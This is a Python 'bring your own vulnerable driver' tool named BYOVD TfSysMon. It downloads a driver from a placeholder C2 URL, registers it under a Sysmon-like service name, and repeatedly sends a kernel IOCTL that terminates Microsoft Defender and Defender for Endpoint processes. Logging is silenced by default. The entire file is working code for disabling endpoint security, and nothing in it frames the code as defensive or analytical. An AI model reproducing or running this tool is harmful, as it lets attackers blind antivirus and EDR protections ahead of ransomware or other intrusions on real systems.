# flake8: noqa


import signal
import sys
import time
from helper import *
import argparse
import logging
import struct
from contextlib import contextmanager

api = WindowsAPIFunctions()


def is_handle_valid(handle):
    if handle == wintypes.HANDLE(-1).value or handle is None:
        return False
    return True


@contextmanager
def driver_context(api, service_name, driver_path, driver_url, driver_sha256):
    try:
        load_driver(api, service_name, driver_path, driver_url, driver_sha256)
        yield
    finally:
        unload_driver(api, service_name, driver_path, remove_driver=False)


def create_ioctl_buffer(pid):
    # Create a 24-byte buffer (4 + 4 + 16)
    buffer = ctypes.create_string_buffer(24)
    # Pack the PID as a 32-bit unsigned integer in little-endian format
    struct.pack_into("<I", buffer, 4, pid)
    return buffer


def terminate_process(device_handle, target_list):
    for target in target_list:
        try:
            pid = get_pid_by_name(api, target)
            if pid:
                # Create the buffer
                ioctl_buffer = create_ioctl_buffer(pid)

                output_buffer = wintypes.DWORD()
                bytes_returned = wintypes.DWORD()

                # logging.debug(f"Sending IOCTL. Buffer size: {len(ioctl_buffer)}")
                # logging.debug(f"PID in buffer: {struct.unpack_from('<I', ioctl_buffer, 4)[0]}")
                # logging.debug(f"Full buffer content: {ioctl_buffer.raw.hex()}")

                result = api.DeviceIoControl(
                    device_handle,
                    IOCTL_TERMINATE_PROCESS,
                    ioctl_buffer,
                    ctypes.sizeof(ioctl_buffer),
                    ctypes.byref(output_buffer),
                    ctypes.sizeof(wintypes.DWORD),
                    ctypes.byref(bytes_returned),
                    None,
                )

                if not result:
                    error_code = ctypes.get_last_error()
                    logging.error(f"Failed to send IOCTL. Error code: {error_code}")
                    raise_windows_error()
                else:
                    pass
                    # logging.debug(f"IOCTL sent successfully. Bytes returned: {bytes_returned.value}")

                logging.info(f"Terminated {target} with PID {pid}")
            else:
                continue
                # logging.warning(f"Process {target} not found.")
        except Exception as e:
            logging.error(f"Error terminating {target}: {e}")


def prep(driver_file):
    logging.debug(f"Preparing driver file: {driver_file}")
    handle = api.CreateFileW(
        driver_file,
        0xC0000000,  # GENERIC_READ | GENERIC_WRITE
        0,
        None,
        3,  # OPEN_EXISTING
        0,
        None,
    )
    if handle == wintypes.HANDLE(-1).value or handle is None:
        return False

    return handle


def signal_handler(sig, frame):
    logging.info("Signal handler triggered")
    sys.exit(0)


def main(
    api,
    service_name,
    driver_path,
    driver_url,
    driver_sha256,
    device_driver,
    tduration,
    target_list,
    debug,
    sleep_interval,
):
    if debug:
        logging.basicConfig(
            level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s"
        )
    else:
        logging.basicConfig(level=logging.CRITICAL + 1)  # Suppress all logging

    with driver_context(api, service_name, driver_path, driver_url, driver_sha256):
        device_handle = None
        try:
            device_handle = prep(device_driver)
            if not device_handle:
                raise ValueError("Failed to obtain a valid device handle")
            logging.info(f"Driver '{service_name}' prepared successfully.")

            timeout = time.time() + tduration

            while time.time() < timeout:
                terminate_process(device_handle, target_list)
                time.sleep(sleep_interval)

        except Exception as e:
            logging.error(f"An error occurred: {e}")
        finally:
            if is_handle_valid(device_handle):
                ctypes.windll.kernel32.CloseHandle(device_handle)
                logging.info("Device handle closed.")


def parse_targets(targets):
    if len(targets) == 1 and "," in targets[0]:
        return [t.strip() for t in targets[0].split(",")]
    return targets


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BYOVD TfSysMon")
    parser.add_argument("--service-name", default="SysMon", help="Name of the service")
    parser.add_argument(
        "--driver-path",
        default=r"C:\Windows\System32\drivers\sysmon.sys",
        help="Path to the driver file",
    )
    parser.add_argument(
        "--driver-url",
        default=r"hxxps://C2/sysmon.sys",
        help="URL to download the driver from",
    )
    parser.add_argument(
        "--driver-sha256",
        default="1c1a4ca2cbac9fe5954763a20aeb82da9b10d028824f42fff071503dcbe15856",
        help="Expected SHA-256 hash of the driver file",
    )
    parser.add_argument(
        "--device-driver", default=r"\\.\TfSysMon", help="Device driver path"
    )
    parser.add_argument("--duration", type=int, default=180, help="Duration in seconds")
    parser.add_argument(
        "--targets",
        nargs="+",
        default=[
            "MsMpEng.exe,NisSrv.exe,MsSense.exe,SenseCnCProxy.exe,"
            "SenseIR.exe,SenseSampleUploader.exe,SenseNdr.exe,"
            "SenseCE.exe, SenseTVM.exe,MPDefenderCoreService.exe"
        ],
        help="List of target processes",
    )
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument(
        "--sleep-interval",
        type=int,
        default=3,
        help="Polling interval in seconds for the termination loop",
    )
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    target_list = parse_targets(args.targets)

    main(
        api,
        args.service_name,
        args.driver_path,
        args.driver_url,
        args.driver_sha256,
        args.device_driver,
        args.duration,
        target_list,
        args.debug,
        args.sleep_interval,
    )
